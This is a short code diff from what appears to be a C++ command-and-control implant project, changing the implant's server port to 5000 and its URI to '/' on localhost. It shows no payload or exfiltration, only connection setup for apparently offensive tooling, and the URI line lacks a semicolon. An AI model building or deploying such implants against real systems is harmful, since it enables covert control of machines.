@@ -11,8 +11,8 @@
 int main(){
     //specify address, port, and URI of server endpoints
     const auto host = "localhost";
-    const auto port = portnum ;
-    const auto uri = "/responses" //--> holds the response from the implant
+    const auto port = 5000 ;
+    const auto uri = "/" //--> holds the response from the implant
     
     // Instantiate our implant object
     Implant implant{ host, port, uri }; 
